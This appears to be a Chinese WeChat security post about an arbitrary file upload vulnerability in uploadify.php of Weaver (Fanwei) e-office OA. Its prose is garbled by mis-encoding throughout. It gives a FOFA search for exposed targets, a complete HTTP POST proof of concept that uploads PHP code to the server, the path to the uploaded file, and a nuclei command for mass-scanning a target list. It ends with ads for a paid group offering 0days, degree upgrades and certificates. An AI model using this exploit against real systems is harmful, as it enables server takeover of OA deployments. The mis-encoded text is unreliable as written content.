> æœ¬æ–‡ç”± [ç®€æ‚¦ SimpRead](http://ksria.com/simpread/) è½¬ç ï¼Œ åŸæ–‡åœ°å€ [mp.weixin.qq.com](https://mp.weixin.qq.com/s/_OrzQNzxGS4JKSheg9UTCw)

**0x01Â é˜…è¯»é¡»çŸ¥**

**èäº‘å®‰å…¨çš„æŠ€æœ¯æ–‡ç« ä»…ä¾›å‚è€ƒï¼Œæ­¤æ–‡æ‰€æä¾›çš„ä¿¡æ¯åªä¸ºç½‘ç»œå®‰å…¨äººå‘˜å¯¹è‡ªå·±æ‰€è´Ÿè´£çš„ç½‘ç«™ã€æœåŠ¡å™¨ç­‰ï¼ˆåŒ…æ‹¬ä½†ä¸é™äºï¼‰è¿›è¡Œæ£€æµ‹æˆ–ç»´æŠ¤å‚è€ƒï¼Œæœªç»æˆæƒè¯·å‹¿åˆ©ç”¨æ–‡ç« ä¸­çš„æŠ€æœ¯èµ„æ–™å¯¹ä»»ä½•è®¡ç®—æœºç³»ç»Ÿè¿›è¡Œå…¥ä¾µæ“ä½œã€‚åˆ©ç”¨æ­¤æ–‡æ‰€æä¾›çš„ä¿¡æ¯è€Œé€ æˆçš„ç›´æ¥æˆ–é—´æ¥åæœå’ŒæŸå¤±ï¼Œå‡ç”±ä½¿ç”¨è€…æœ¬äººè´Ÿè´£ã€‚æœ¬æ–‡æ‰€æä¾›çš„å·¥å…·ä»…ç”¨äºå­¦ä¹ ï¼Œç¦æ­¢ç”¨äºå…¶ä»–ï¼ï¼ï¼**

**0x02 æ¼æ´æè¿°**

æ³›å¾® e-office ç³»ç»Ÿæ˜¯æ ‡å‡†ã€æ˜“ç”¨ã€å¿«é€Ÿéƒ¨ç½²ä¸Šçº¿çš„ä¸“ä¸šååŒ OA è½¯ä»¶, å›½å†…ååŒ OA åŠå…¬é¢†åŸŸé¢†å¯¼å“ç‰Œ, è‡´åŠ›äºä¸ºä¼ä¸šç”¨æˆ·æä¾›ä¸“ä¸š OA åŠå…¬ç³»ç»Ÿã€ç§»åŠ¨ OA åº”ç”¨ç­‰ååŒ OA æ•´ä½“è§£å†³æ–¹æ¡ˆã€‚æ³›å¾® OA e-office å¹³å° uploadify.php å¤„å­˜åœ¨ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œæ”»å‡»è€…é€šè¿‡æ¼æ´å¯ä»¥è·å–æœåŠ¡å™¨æƒé™ã€‚

![](https://mmbiz.qpic.cn/mmbiz_png/GWXBjgPE49wUSyubfbxYAz6nCNFr6lxiahYw7VUZnnzu0xTITrZHVPdrtMUG3JKGcl3eNAwsiaiaXD4Siajq3azMicw/640?wx_fmt=png)

**0x03 æ¼æ´å¤ç°**

**fofa-qeury: app="æ³›å¾® - EOffice"**

1. æ‰§è¡Œ poc ä¸Šä¼ æ–‡ä»¶ï¼Œå¹¶å¾—åˆ°å›æ˜¾

```
1.ä¸Šä¼ pocï¼š
POST /inc/jquery/uploadify/uploadify.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 227
Accept-Encoding: gzip, deflate
Connection: close
Content-Type:Â multipart/form-data;Â boundary=gfgea1saasf5dsgg5fd5fds15gf5kj51vd1s
--gfgea1saasf5dsgg5fd5fds15gf5kj51vd1s
Content-Disposition: form-data; 
Content-Type:Â application/octet-stream
<?phpÂ echoÂ 12349847;?>
--gfgea1saasf5dsgg5fd5fds15gf5kj51vd1s--
2.è®¿é—®è·¯å¾„/attachment/{{å›æ˜¾çš„æ•°å­—}}/hellofanwei.php

```

![](https://mmbiz.qpic.cn/mmbiz_png/GWXBjgPE49wUSyubfbxYAz6nCNFr6lxia2JsSvQK3jg18Dg9wsBDnE7t9C7XkUZTG5HkXtW1liblpFQbuBickSXnw/640?wx_fmt=png)

2.nuclei éªŒè¯è„šæœ¬å·²å‘è¡¨äºçŸ¥è¯†æ˜Ÿçƒ

```
nuclei.exe -t fanwei-eoffice-uploadify-fileupload.yaml -l subs.txt -stats

```

![](https://mmbiz.qpic.cn/mmbiz_png/GWXBjgPE49wUSyubfbxYAz6nCNFr6lxiaHbNiax0VibMgaExcW8N6f9sqWuVlBaEOymynVv9RAK7TkG4RVrLGyA0Q/640?wx_fmt=png)

**ç½‘ç»œå®‰å…¨ç¥å…µåˆ©å™¨åˆ†äº«**

**ç½‘ç»œå®‰å…¨æ¼æ´ N/0day åˆ†äº«**

 **åŠ å…¥æ˜Ÿçƒè¯·æ‰«æä¸‹æ–¹äºŒç»´ç ï¼Œæ›´å¤šç²¾ï¼Œæ•¬è¯·æœŸå¾…ï¼**

ğŸ‘‡ğŸ‘‡ğŸ‘‡

![](https://mmbiz.qpic.cn/mmbiz_jpg/GWXBjgPE49zs4eNkNzwGvylxKjRnH2aibQqdbEUPicwHRpyuIhk7YdcECWw9kZGCibot3aRDzS4ADTmywx57c7QBw/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)

å­¦å†ï¼šéå…¨æ—¥åˆ¶çš„å­¦å†æå‡ï¼Œé«˜å‡ä¸“ï¼Œä¸“å‡æœ¬å¯å­¦ä½

å®‰å…¨è¯ä¹¦ï¼šcisp Â cissp Â cisp-pte pmp ç­‰  

Â æœ‰éœ€è¦çš„ç§èŠ

![](https://mmbiz.qpic.cn/mmbiz_jpg/7XAvvlbibo1So1mMiaCVnErtWQohjbUCicMhkLFUoBRSSicJ57kBDLLyhWDPzO9rAl4mrnBXC0WWHYibms0odlomHoQ/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)